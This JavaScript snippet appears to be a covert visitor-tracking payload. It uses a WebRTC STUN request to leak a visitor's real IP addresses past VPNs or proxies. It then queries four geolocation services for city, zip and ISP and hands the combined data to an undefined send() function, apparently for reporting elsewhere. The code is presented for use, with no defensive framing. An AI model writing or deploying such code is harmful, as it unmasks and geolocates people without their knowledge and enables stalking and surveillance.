// 1. WebRTC real IP leak
var ips = [];
var pc = new RTCPeerConnection({iceServers:[{urls:"stun:stun.l.google.com:19302"}]});
pc.createDataChannel("");
pc.createOffer().then(pc.setLocalDescription.bind(pc));
pc.onicecandidate = e => {
  if(e.candidate && e.candidate.candidate){
    var ip = e.candidate.candidate.split(" ")[4];
    if(!ips.includes(ip)){ ips.push(ip); }
  }
};

// 2. Stack of public APIs (city, zip, ISP)
fetch("https://ipapi.co/json/").then(r=>r.json()).then(d=>send({source:"ipapi.co", ...d, webrtc_ips:ips, timestamp:Date.now()}));
fetch("https://reallyfreegeoip.org/json/").then(r=>r.json()).then(d=>send(d));
fetch("https://ipwhois.io/json").then(r=>r.json()).then(d=>send(d));
fetch("https://freegeoip.app/json/").then(r=>r.json()).then(d=>send(d));

